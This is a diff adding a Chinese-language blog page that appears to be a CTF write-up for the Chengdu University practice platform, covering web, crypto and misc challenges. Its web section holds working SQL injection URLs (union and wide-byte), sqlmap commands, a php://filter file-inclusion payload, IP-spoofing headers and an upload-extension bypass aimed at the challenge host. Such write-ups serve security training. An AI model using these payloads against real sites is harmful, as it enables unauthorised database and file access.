@@ -1,0 +1,969 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+    
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF-成都大学网络攻防演练平台, wh1te">
+    <meta name="description" content="About CTF&amp;amp;wp
+
+
+成都大学网络攻防平台这是跟几个老哥一起刷的，只不过我太菜。一直没时间，今天才决定要把wp写一下。由于太菜，re没有做，回头问问大佬们再写。
+成都大学网络攻防平台
+WEBweb1很简单的入门题目，F12修">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>CTF-成都大学网络攻防演练平台 | wh1te</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+</head>
+
+</head>
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">wh1te</span>
+                    </a>
+                </div>
+                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wh1te</div>
+        <div class="logo-desc">
+            
+            不忘初心，方得始终
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link"><a href="https://github.com/lddp" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:1061722245@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 1061722245" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        CTF-成都大学网络攻防演练平台
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1,
+    #articleContent h2,
+    #articleContent h3,
+    #articleContent h4,
+    #articleContent h5,
+    #articleContent h6 {
+        padding-top: 76px;
+        margin-top: -76px;
+    }
+
+    #articleContent h1 {
+        line-height: 3.5rem;
+    }
+
+    #articleContent h2 {
+        line-height: 3.2rem;
+    }
+
+    #articleContent h3 {
+        line-height: 2.8rem;
+    }
+
+    #articleContent h4 {
+        line-height: 2.5rem;
+    }
+
+    #articleContent h5 {
+        line-height: 2.2rem;
+    }
+
+    #articleContent h6 {
+        line-height: 1.9rem;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            
+            <div class="article-tag">
+                
+                <a href="/tags/write-up/" target="_blank">
+                    <span class="chip bg-color">write up</span>
+                </a>
+                
+                <a href="/tags/CTF/" target="_blank">
+                    <span class="chip bg-color">CTF</span>
+                </a>
+                
+            </div>
+            
+            <div class="post-info">
+                
+                <span class="post-cate">
+                    <i class="fa fa-bookmark fa-fw icon-category"></i>
+                    
+                    <a href="/categories/write-up/" class="post-category" target="_blank">
+                        write up
+                    </a>
+                    
+                </span>
+                
+
+                <span class="post-date">
+                    <i class="fa fa-clock-o fa-fw"></i>2018-12-29
+                </span>
+            </div>
+        </div>
+        <hr>
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>About CTF&amp;wp</p>
+<a id="more"></a>
+
+<h2 id="成都大学网络攻防平台"><a href="#成都大学网络攻防平台" class="headerlink" title="成都大学网络攻防平台"></a>成都大学网络攻防平台</h2><p>这是跟几个老哥一起刷的，只不过我太菜。一直没时间，今天才决定要把wp写一下。由于太菜，re没有做，回头问问大佬们再写。</p>
+<p><a href="http://47.104.68.102/challenges" target="_blank" rel="noopener">成都大学网络攻防平台</a></p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>很简单的入门题目，F12修改下html限制就好了。</p>
+<pre><code class="html">&lt;input type=&quot;text&quot; name=&quot;key&quot; maxlength=&quot;6&quot;&gt;</code></pre>
+<p>把maxlength删除了就可以了。</p>
+<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>get提提交个数据就好了。</p>
+<pre><code class="bash">http://ctf.cdusec.org:8082/web2/?cdusec=tql</code></pre>
+<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><p>post提交一个数据。firefox的F12就可以实现，或者你可以选择hackbar。</p>
+<h4 id="Three-Zero-Two"><a href="#Three-Zero-Two" class="headerlink" title="Three Zero Two"></a>Three Zero Two</h4><p>看题目就可以知道，是一个302跳转，点开题目链接进去一看，url为：</p>
+<pre><code class="bash">http://ctf.cdusec.org:8082/web4/1ndex.php</code></pre>
+<p>注意是<code>1ndex.php</code>，而不是<code>index.php</code>。不用墨迹，直接抓包就好了。<br><img src="http://t1.aixinxi.net/o_1cvmrn1du4qr1pq1kc9fhp1h89a.png-j.jpg" alt="image"></p>
+<!-- ![image](http://t1.aixinxi.net/o_1cvmrn1du4qr1pq1kc9fhp1h89a.png-w.jpg) -->
+<h4 id="Where-are-you-from"><a href="#Where-are-you-from" class="headerlink" title="Where are you from?"></a>Where are you from?</h4><p>进入页面，发现提示，只允许管理员进入。很简单，管理员登陆一般都是在本地进行的，所以直接进行客户端ip伪造就好了。</p>
+<p>五种客户端IP伪造方式：</p>
+<pre><code class="bash">X-Forwarded-For
+Client-IP
+x-remote-IP
+x-originating-IP
+x-remote-addr</code></pre>
+<p>那么接下来就好办了，伪造客户端IP地址。</p>
+<pre><code>GET /web5/ HTTP/1.1
+Host: ctf.cdusec.org:8082
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: 127.0.0.1
+Connection: close
+Upgrade-Insecure-Requests: 1</code></pre><p>发包直接getflag。</p>
+<h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><p>题目源码：</p>
+<pre><code class="php">&lt;?php 
+error_reporting(0); 
+include_once(&#39;flag.php&#39;); 
+highlight_file(&#39;index.php&#39;);  
+
+$md51 = md5(&#39;QNKCDZO&#39;); 
+$a = $_GET[&#39;b&#39;]; 
+$md52 = md5($a); 
+if(isset($a)){ 
+if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) { 
+    echo $flag; 
+} else { 
+    echo &quot;false!!!&quot;; 
+}} 
+?&gt;</code></pre>
+<p>这个就参考我之前写的那个<a href="https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/" target="_blank" rel="noopener">PHP黑魔法</a>，第一个就是解决这个题目的方法，在里面随便找一组字符串，提交就可以获取flag。这是一个典型的hash比较缺陷题目。</p>
+<h4 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h4><p>方法一：</p>
+<p>sqlmap一把梭</p>
+<pre><code class="bash">sqlmap -u &quot;http://ctf.cdusec.org:8083/sqli.php?id=1&quot; --dbs</code></pre>
+<p>方法二：</p>
+<p>联合查询：</p>
+<pre><code class="sql">http://ctf.cdusec.org:8083/sqli.php?id=-1%20union%20select%201,2--+</code></pre>
+<p>查库</p>
+<pre><code>http://ctf.cdusec.org:8083/sqli.php?id=-1%20union%20select%201,database()--+</code></pre><p>查表</p>
+<pre><code>http://ctf.cdusec.org:8083/sqli.php?id=-1%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+</code></pre><p>懒得查字段名了，直接猜flag</p>
+<pre><code>http://ctf.cdusec.org:8083/sqli.php?id=-1%20union%20select%201,flag%20from%20flag--+</code></pre><h4 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h4><pre><code class="php">&lt;?php
+echo &quot;PHP 5.4.26&quot;;
+mt_srand(xxxxxxxx);
+# We can&#39;t tell you what is xxxxxxxx!
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo &quot;echo flag{&quot;.mt_rand().&quot;}&quot;
+?&gt;
+984489752
+619387123
+2070958802
+2105559368
+1909473866
+1679323715
+1910332168
+640569646
+1103001695
+1871111424
+flag
+
+So, Please guess the flag!</code></pre>
+<p>先做一个科普：</p>
+<p>首先我们要知道，每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种。（播种是由mt_srand()函数完成的），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以前面也说到，同一个种子下随机生成的随机数值是相同的。同时，也解释了我们破解随机种子的可行性。如果每次调用mt_rand()函数都需要生成一个随机种子的话，那根本就没办法破解。</p>
+<p>mt_srand()函数播种的时候，只有在第一次调用<code>mt_rand()</code>函数的时候才会使用。所以如果我们知道了第一次生成的随机数值，就可能爆破出随机数种子。</p>
+<p><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">工具</a></p>
+<p>注意，题目中标示了php的版本，注意一定要把版本搞对，不然可能一直都跑不对。</p>
+<p>工具自带的README实在是比较难理解，推荐看这个<a href="https://www.openwall.com/php_mt_seed/README" target="_blank" rel="noopener">php_mt_seed</a>。把题目给的生成的一组随机数的第一个数用作爆破。</p>
+<pre><code>./php_mt_seed 984489752</code></pre><p>结果为</p>
+<pre><code class="bash">seed = 12345679
+seed = 1039460795</code></pre>
+<p>再模仿一个php的脚本</p>
+<pre><code class="php">&lt;?php
+$seed = xxxx;
+mt_srand($seed);
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo &quot;echo flag{&quot;.mt_rand().&quot;}&quot;
+?&gt;</code></pre>
+<p>把上面的两组seed值带入，跑两次，得出两组flag：</p>
+<pre><code>flag{2003170939}
+flag{1014721809}</code></pre><p>接下来，提交两次，就可以知道哪个为正确的flag</p>
+<h4 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h4><p>很常见的一个文件包含漏洞，没啥技术含量。可以参考我之前写的<a href="https://lddp.github.io/2018/11/09/WEB-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank" rel="noopener">文件包含漏洞</a></p>
+<pre><code class="bash">http://ctf.cdusec.org:8085/index.php?filename=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
+<p>然后进行base64解密就好了。</p>
+<h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h4><p>这个题目根本就是个误导，虽然有serialize函数，但问题根本就不是这里，问题的根本是base64填充。直接上脚本：</p>
+<pre><code class="python">import requests as req
+
+data = {
+    &quot;id&quot;: &#39; &#39;*100+&#39;cdusec-ctflag???&#39;
+}
+res = req.post(&quot;http://ctf.cdusec.org:8082/web7/index.php&quot;, data=data)
+if res.status_code == 200:
+    print(res.content)</code></pre>
+<h4 id="更简单的注入"><a href="#更简单的注入" class="headerlink" title="更简单的注入"></a>更简单的注入</h4><p>方法一：</p>
+<p>sqlmap一把梭：</p>
+<pre><code>sqlmap -u &quot;http://ctf.cdusec.org:8084/sqli.php?id=1&quot; --dbs</code></pre><p>方法二：</p>
+<p>盲注，结合上面的简单的注入，加上猜解判断即可。（PS：实际上我是sqlmap一把梭）</p>
+<h4 id="有趣的注入"><a href="#有趣的注入" class="headerlink" title="有趣的注入"></a>有趣的注入</h4><p>访问<code>http://ctf.cdusec.org:8086/sqli.php?id=1</code>，查看源代码，发现</p>
+<pre><code class="html">&lt;meta charset=&quot;gbk&quot; /&gt;</code></pre>
+<p>这就好办了，典型的宽字节注入，详情查看我的博客的<a href="https://lddp.github.io/2018/07/24/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">宽字节注入</a>。</p>
+<p>方法一：bash</p>
+<pre><code>sqlmap -u &quot;http://ctf.cdusec.org:8086/sqli.php?id=-1%df&#39;&quot; --dbs</code></pre><p>方法二：</p>
+<p>手动宽字节注入：</p>
+<p>一样的流程，只不过跟简单的注入相比，多了一个%df而已。直接上最终的payload：</p>
+<pre><code class="bash">http://ctf.cdusec.org:8086/sqli.php?id=-1%df%27%20union%20select%201,2,flag%20from%20flag--+</code></pre>
+<h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><p>进入页面，发现需要进行登陆，但是并不知道密码，一开始猜测可能是暴力破解弱口令，但是看了一下请求包发现，就在请求包里<br><img src="http://t1.aixinxi.net/o_1cvpfqefk10g51d9e10891fl43una.png-w.jpg" alt="image"></p>
+<!-- ![image](http://t1.aixinxi.net/o_1cvpfqefk10g51d9e10891fl43una.png-j.jpg) -->
+<p>拿到了密码，直接复制登陆，进入到上传页面。<br>随便上传一个png文件，显示成功。但是上传php文件的时候，开始拒绝。</p>
+<pre><code>You cannot upload files of this type!</code></pre><p>然后尝试修改后缀php3，然后发现直接成功了。。。。<br><img src="http://t1.aixinxi.net/o_1cvpqokao16mar29i3n1vuh1g13a.png-w.jpg" alt="image"></p>
+<!-- ![image](http://t1.aixinxi.net/o_1cvpqokao16mar29i3n1vuh1g13a.png-j.jpg) -->
+
+<p>关于文件上传部分知识点，在我博客<a href="https://lddp.github.io/2018/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E4%B8%80/" target="_blank" rel="noopener">文件上传</a>中有介绍。</p>
+<h4 id="这个注入有点难？"><a href="#这个注入有点难？" class="headerlink" title="这个注入有点难？"></a>这个注入有点难？</h4><p>没做出来。。。。。。</p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Crypto-签到"><a href="#Crypto-签到" class="headerlink" title="Crypto_签到"></a>Crypto_签到</h4><p>直接就有flag。。。</p>
+<h4 id="凯撒大帝降临"><a href="#凯撒大帝降临" class="headerlink" title="凯撒大帝降临"></a>凯撒大帝降临</h4><p>直接进行凯撒位移就行。</p>
+<h4 id="fuck！这是什么鬼"><a href="#fuck！这是什么鬼" class="headerlink" title="fuck！这是什么鬼"></a>fuck！这是什么鬼</h4><p>js-fuck编码，直接在控制台运行就可以了。</p>
+<h4 id="不一样的morse"><a href="#不一样的morse" class="headerlink" title="不一样的morse"></a>不一样的morse</h4><p>上网址<a href="https://tool.lu/morse/" target="_blank" rel="noopener">摩斯密码解密</a></p>
+<h4 id="你熟悉键盘吗？"><a href="#你熟悉键盘吗？" class="headerlink" title="你熟悉键盘吗？"></a>你熟悉键盘吗？</h4><p>题目：</p>
+<pre><code>4eszrfvd ygvhnji 76tyujnb 7412 4eszrfvd</code></pre><p>你可以按照顺序，在键盘上画一画，答案就出来了，加上flag就行。</p>
+<pre><code>flag{ANgLA}</code></pre><h4 id="啊啊啊蕾蕾姐被表白了"><a href="#啊啊啊蕾蕾姐被表白了" class="headerlink" title="啊啊啊蕾蕾姐被表白了"></a>啊啊啊蕾蕾姐被表白了</h4><p>题目：</p>
+<pre><code>33532141437432217493</code></pre><p>重点：手机短信、内容长度是偶数、数字的第二位都在1～4之间<br><img src="http://t1.aixinxi.net/o_1cvrujbifcgek3omhm18o7t25a.jpg-w.jpg" alt="image"></p>
+<!-- ![image](http://t1.aixinxi.net/o_1cvrujbifcgek3omhm18o7t25a.jpg-j.jpg) -->
+<p>可以看下这个图，123456789对应的9个键。把题目给的一串数字两两一组划分开：</p>
+<pre><code>33 53 21 41 43 74 32 21 74 93</code></pre><p>按照手机的9键输入一一对应：</p>
+<pre><code>f l a g i s e a s y</code></pre><p>加上flag{}就是最终答案了。</p>
+<h4 id="奇怪的字符串"><a href="#奇怪的字符串" class="headerlink" title="奇怪的字符串"></a>奇怪的字符串</h4><p>题目：</p>
+<pre><code>NYYNNYYN NYYNYYNN NYYNNNNY NYYNNYYY NYYYYNYY NYYNYNYY NNYYNNYY NYYYYNNY NYNYYYYY NYYNYNNY NNYYNYNY NYNYYYYY NYYNYNNN NYYNNYNY NYNYNNYN NYYNNYNY NYYYYYNY</code></pre><p>这里我给出两个单词，这个题目就一目了然了。</p>
+<pre><code>NO YES</code></pre><p>而NO跟YES在计算机的世界里又代表0跟1。这个题目就可以转化为：</p>
+<pre><code>01100110 01101100 01100001 01100111 01111011 01101011 00110011 01111001 01011111 01101001 00110101 01011111 01101000 01100101
+01010010 01100101 01111101</code></pre><p>二进制转字符串（注意：空格是需要去掉的）：</p>
+<pre><code>flag{k3y_i5_heRe}</code></pre><h4 id="the-other-base’s-member"><a href="#the-other-base’s-member" class="headerlink" title="the other base’s member"></a>the other base’s member</h4><p>题目：</p>
+<pre><code>2ZarhfbBYwrHU7FRGN2YLbqgcCW7giT6KZx8KhF3NV2</code></pre><p>看起来是个base加密，嗯，它还就是个base加密……</p>
+<p>base64解密失败，base32解密失败，base16解密失败……</p>
+<p>再去看题目，the other base’s member，其他的base方式，我就去试了试base58，成功。</p>
+<p>base58解密：</p>
+<pre><code>flag{B4Se_f4mi1y_v3Ry_BBBBBBig}</code></pre><h4 id="easy-base-family"><a href="#easy-base-family" class="headerlink" title="easy_base_family"></a>easy_base_family</h4><p>就是一个超级大的base全家桶，我第一次写的脚本比较笨，不建议采纳，可以用try函数进行改进，先po上我的脚本，欢迎大家给我提建议。</p>
+<pre><code class="python">import base64
+with open(&#39;base_family.txt&#39;,&#39;r+&#39;) as f:
+    text = f.read()
+    text = base64.b16decode(text)
+    text = base64.b64decode(text)
+    text = base64.b32decode(text)
+    text = base64.b16decode(text)
+    text = base64.b16decode(text)
+    text = base64.b32decode(text)
+    text = base64.b16decode(text)
+    text = base64.b64decode(text)
+    text = base64.b64decode(text)
+    text = base64.b32decode(text)
+    text = base64.b64decode(text)
+    text = base64.b16decode(text)
+    text = base64.b32decode(text)
+    text = base64.b32decode(text)
+    text = base64.b32decode(text)
+    text = base64.b64decode(text)
+    text = base64.b16decode(text)
+    text = base64.b32decode(text)
+    text = base64.b16decode(text)
+    text = base64.b64decode(text)
+    text = base64.b64decode(text)
+    text = base64.b16decode(text)
+    text = base64.b16decode(text)
+    text = base64.b16decode(text)
+    #text = text.decode(&#39;utf-8&#39;)
+    print(text)</code></pre>
+<h4 id="蕾蕾姐的id"><a href="#蕾蕾姐的id" class="headerlink" title="蕾蕾姐的id"></a>蕾蕾姐的id</h4><p>题目主要内容就是进行md5爆破了，不废话了，上脚本：</p>
+<pre><code class="python">import hashlib
+str=&quot;qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM0987654321&quot;
+for a in str:
+    for b in str:
+        for c in str:
+            for d in str:
+                ming=a+b+c+d
+                ming=bytes(ming,encoding=&#39;utf-8&#39;)
+                m=hashlib.md5()
+                m.update(ming)
+                if(m.hexdigest()[2:5]==&#39;fdc&#39;) and (m.hexdigest()[29:32]==&#39;41d&#39;):
+                    print(ming)
+                    print(m.hexdigest())
+</code></pre>
+<h4 id="棋局"><a href="#棋局" class="headerlink" title="棋局"></a>棋局</h4><p>题目：</p>
+<pre><code>546865206c656e677468206f662074686520666c6167277320636f6e74656e743a203130
+
+密文：rquutrqqrtulrutuuurr</code></pre><p>看题目提示就知道是一个棋盘密码。。。<br>直接找了个脚本在跑：</p>
+<pre><code class="python">import itertools
+key = []
+cipher = &quot;rquutrqqrtulrutuuurr&quot;
+
+for i in itertools.permutations(&#39;rqutl&#39;,5):
+    key.append(&#39;&#39;.join(i))
+
+for now_key in key:
+    solve_c = &quot;&quot;
+    res = &quot;&quot;
+    for now_c in cipher:
+        solve_c += str(now_key.index(now_c))
+    for i in range(0,len(solve_c),2):
+        now_ascii = int(solve_c[i])*5+int(solve_c[i+1])+97
+        if now_ascii&gt;ord(&#39;i&#39;):
+            now_ascii+=1
+        res += chr(now_ascii)
+    if &quot;flag&quot; in res:
+        print(now_key,res)</code></pre>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Easy-misc3"><a href="#Easy-misc3" class="headerlink" title="Easy_misc3"></a>Easy_misc3</h4><p>题目： What is the docx？</p>
+<p>这里科普一个知识点，docx，其本质就是一个压缩包。所以你把下载下来的docx文件改为zip，就可以看到里面的flag.txt了。</p>
+<h4 id="Esay-misc2"><a href="#Esay-misc2" class="headerlink" title="Esay_misc2"></a>Esay_misc2</h4><p>题目：xor</p>
+<p>图片异或题目，使用神器Stegsolve进行xor异或就行了。<br>图片懒得截了。语言描述一波……</p>
+<p>使用工具打开图片后，然后转到alpha plane0通道，点file菜单，点击save as保存为bmp格式，然后同理把blue，red，green的0通道分别保存为bmp格式。</p>
+<p>保存完后打开保存的alpha的bmp图片，然后点击菜单栏的analyse，点击image combiner打开另外一种颜色的0通道保存的图片，进行两张图片异或对比，flag就出来了</p>
+<h4 id="catch"><a href="#catch" class="headerlink" title="catch"></a>catch</h4><p>题目：ping</p>
+<p>科普：ping使用的是ICMP协议。</p>
+<p>使用wireshark打开，过滤ICMP，看看数据包的内容，找data数据就可以了。</p>
+<h4 id="你倒是先解压啊"><a href="#你倒是先解压啊" class="headerlink" title="你倒是先解压啊"></a>你倒是先解压啊</h4><p>建议使用360压缩，绕过所有伪加密。。。</p>
+<p>docx文件，还是一个压缩包，进去慢慢找一找，会有一个flag的图片的。</p>
+<h4 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h4><p>巅峰极客大赛真题。</p>
+<p>推荐<a href="https://blog.csdn.net/like98k/article/details/81158636" target="_blank" rel="noopener">郁师傅的博客</a></p>
+<h4 id="一直刷新"><a href="#一直刷新" class="headerlink" title="一直刷新"></a>一直刷新</h4><p>图片隐写，使用F5刷新工具即可</p>
+<p><a href="https://github.com/matthewgao/F5-steganography.git" target="_blank" rel="noopener">工具</a></p>
+<pre><code>flag{F5_f5_F5_Ez!!!}</code></pre><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>RE有老哥给过我wp，但是由于水平不够，RE实在是不会，于是乎就先不写了。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>成都大学的平台还是不错的，不少的脑洞题目，比较有感觉。继续肝newbugku了，写的差不多了，再出wp。（PS：最近图床换了，所以很不稳定，各种懒，各种不截图，将就看吧，膜各位大佬）</p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
